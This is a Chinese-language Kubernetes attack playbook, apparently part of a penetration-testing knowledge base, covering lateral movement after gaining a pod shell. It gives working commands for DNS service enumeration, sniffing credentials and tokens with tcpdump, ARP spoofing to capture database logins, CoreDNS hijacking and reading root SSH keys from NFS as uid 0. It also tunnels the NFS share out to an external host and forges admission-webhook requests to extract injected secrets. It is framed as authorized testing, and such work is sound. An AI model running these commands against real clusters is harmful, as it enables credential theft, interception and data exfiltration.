# K8s 攻击面：组件、网络与存储

> 适用：已有一个 Pod Shell 或 SA Token，需要在集群内做服务发现、明文流量取证、共享存储越权与准入策略欺骗的授权评估。

## 认什么

集群内横向的四条独立路线：DNS 服务发现（找到有什么）、sidecar 共享网络命名空间（Docker 与 K8s 都成立）、远程文件系统（NFS/EFS 只靠网络 ACL）、准入 Webhook（不校验调用方）。

### 1. DNS 命名规则（K8s 服务发现的基础）

| 资源 | 格式 | 例 |
|---|---|---|
| Service | `<svc>.<ns>.svc.cluster.local` | `redis.default.svc.cluster.local` |
| Pod | `<ip-虚线>.<ns>.pod.cluster.local` | `10-244-0-5.default.pod.cluster.local` |
| Headless | `<pod>.<svc>.<ns>.svc.cluster.local` | `web-0.nginx.default.svc.cluster.local` |

- 后缀不一定是 `cluster.local`，看 `/etc/resolv.conf` 的 `search` 行。
- SRV 记录直接暴露端口：`nslookup -type=srv redis.default.svc.cluster.local` → `0 50 6379 ...`。
- 常见 Service CIDR：`10.96.0.0/16`、`10.100.0.0/16`、K3s `10.43.0.0/16`；Pod CIDR：Flannel `10.244.0.0/16`、K3s `10.42.0.0/16`。

### 2. 值得优先打的服务

| 类型 | 特征 | 价值 |
|---|---|---|
| 策略引擎 | `kyverno-svc.kyverno`、`gatekeeper-webhook-service.gatekeeper-system` | 伪造 AdmissionReview 骗取注入的 Secret |
| 管控面 | 6443 / 10250 / 2379 / 4040 / 2746 / 8443 | 集群接管 |
| 监控运维 | Prometheus 9090、Grafana 3000（`admin:admin`）、Dashboard 8443 | 指标、配置、默认口令 |
| 平台 | Kubeflow 8080、Argo Workflows 2746、Weave Scope 4040 | 建 Notebook/Workflow/exec |

### 3. 存储与 sidecar 判定

- 远程挂载：`mount | grep -E 'nfs|efs|cifs|gluster|ceph'`；EFS 形如 `fs-xxx.efs.<region>.amazonaws.com:/ on /efs type nfs4`（DNS 名直接暴露 region 与 filesystem id）。
- Secret/ConfigMap 是只读 tmpfs：`mount | grep tmpfs | grep ro`、`find /var/run/secrets -type f`。
- sidecar：`ps aux | grep -E 'envoy|pilot-agent|linkerd'`；同 Pod 全部容器共享网络命名空间，因此同 Pod 内任何容器都能抓到 sidecar 流量。
- NetworkPolicy 不等于网络隔离：不拦同节点二层通信、对 `hostNetwork` Pod 无效、默认不限制 egress、也拦不住 `169.254.169.254`。

## 打哪（命令）

DNS 批量发现（先定 CIDR，禁止 /8 起扫）：

```bash
echo $KUBERNETES_SERVICE_HOST; cat /etc/resolv.conf
nslookup kubernetes.default.svc.cluster.local
k8spider scan -subnet 10.96.0.0/16      # PTR + SRV + 多线程
k8spider scan -subnet 10.244.0.0/16     # Pod CIDR
dig axfr cluster.local @$(awk '/nameserver/{print $2; exit}' /etc/resolv.conf)
```

服务与端口验证：

```bash
for port in 80 443 2379 3000 4040 6443 8080 8443 9090 10250 2746; do
  for svc in $(kubectl get svc -A -o jsonpath='{range .items[*]}{.metadata.name}.{.metadata.namespace} {end}' 2>/dev/null); do
    timeout 2 bash -c "echo >/dev/tcp/$svc.svc.cluster.local/$port" 2>/dev/null && echo "OPEN $svc:$port"
  done
done
```

Sidecar / 明文流量：

```bash
tcpdump -A -s 0 'tcp port 80 or tcp port 8080'
tcpdump -A -s 0 | grep -iE 'authorization|password|token|set-cookie'
socat -v TCP-LISTEN:8080,fork TCP:target-svc.default.svc.cluster.local:80
# 同节点二层：NET_RAW 默认开启，ARP 双向欺骗后可截 MySQL/Redis 认证
arpspoof -t POD_A_IP POD_B_IP & arpspoof -t POD_B_IP POD_A_IP & ngrep -d eth0 -W byline port 3306
# CoreDNS 有写权限时直接改解析
kubectl edit configmap coredns -n kube-system   # rewrite name internal-api... attacker...
```

共享存储（先读，再判 uid 语义）：

```bash
showmount -e NFS_SERVER
nfs-ls "nfs://NFS_SERVER:2049//?version=4"
nfs-cat "nfs://NFS_SERVER:2049//root/.ssh/id_rsa?version=4&uid=0&gid=0"
ssh -R 2049:NFS_SERVER:2049 -Nf user@PUBLIC_IP -o StrictHostKeyChecking=no   # 回挂到自有机器
```

准入 Webhook 欺骗（Kyverno / Gatekeeper 不校验调用方）：

```bash
curl -k https://kyverno-svc.kyverno.svc.cluster.local/mutate   # GET 返回 only POST/OPTIONS supported = 可达
curl -k -X POST -H 'Content-Type: application/json' -d @/tmp/admission.json \
  https://kyverno-svc.kyverno.svc.cluster.local/mutate
curl -k -X POST -H 'Content-Type: application/json' -d @/tmp/admission.json \
  https://gatekeeper-webhook-service.gatekeeper-system.svc.cluster.local/v1/admit
```
AdmissionReview 必填：`uid`、`name`、`namespace`（必须命中策略 `match` 的 namespace）、`kind`/`requestKind`、`resource`/`requestResource`、`operation: CREATE`、`object.spec.containers` 至少一个容器；Kyverno 缺 `requestKind` 会 panic。响应 `response.patch` 是 base64 的 JSONPatch：`echo '<b64>' | base64 -d | jq .`。必须 `-k` + HTTP/2，不加 `--http1.1`。

## 什么算成

- DNS 线：扫出具体 `<svc>.<ns>` 列表，并用 SRV 或端口探测拿到真实端口（只 PTR 到一堆 IP 不算）。
- 流量线：抓到明文 `Authorization: Bearer ...`、`Set-Cookie`、DB 认证行（ngrep/tcpdump 原样输出），或劫持后目标 Pod 的请求落到我们监听的地址（同 URL 对照）。
- 存储线：以 `uid=0` 读到该 Pod 身份本不可读的对象（如 `/root/.ssh/id_rsa`），证明服务端未做 root_squash/uid 映射；EFS 则在授权范围内做**可回滚写**验证（写一个 canary 对象→读回→删除）。
- Webhook 线：匿名 POST 返回 200 且 patch 解出注入的 env/secret/volume（`name`+`value` 成对出现）；Gatekeeper 至少能返回策略拒绝细节。
- 策略线：CoreDNS `rewrite` 生效后可复现"同一域名解析到我们 Pod"的解析结果（`nslookup` + 实际请求两段证据）。

## 假点

- PTR 有响应但对应 Service 无端口/无进程：只是 DNS 记录，不是可打服务。
- tcpdump 全是 TLS 密文：mTLS 没在 sidecar 层终止，不能声称"抓到凭据"；换 Istio 策略绕过或抓宿主机侧。
- Webhook 端口通但返回 `invalid content-type`/400：只证明端口活着；Kyverno panic 只证明不校验来源，不等于拿到 Secret。
- namespace 与策略 `match` 不匹配时返回空 patch/allow——最常见的误判，换 namespace 重试再下结论。
- `showmount` 列出导出但 mount 被拒：`root_squash`/`all_squash`/网络 ACL 在起作用，属假点。
- 扫到 Grafana 3000 只是登录页：未授权与弱口令是两件事，必须实际登录或读到数据。
- NetworkPolicy 存在就断言"横向被阻断"：同节点二层与 hostNetwork 都不受它约束。

## 与其他包联动

- 逃逸判定、集群接管、Ingress/Istio：`./cloud-06-K8s攻击面-逃逸与集群.md`。
- 节点上的 Docker/containerd 与镜像仓库：`./cloud-08-容器运行时与镜像.md`。
- 抓到云凭据后打对象存储/云函数：`./cloud-09-对象存储与Serverless.md`。
- 集群凭据来自 CI、GitOps 或镜像仓库：`./cloud-10-CICD与供应链与IaC.md`。
- 策略引擎背后是 OIDC/JWT 时：`../../web-auth-access/knowledge/oauth-jwt-test.md`。
- 报告口径与定级：`../../../../rules/40-evidence-report.md`；写操作边界：`../../../../rules/20-min-harm.md`。
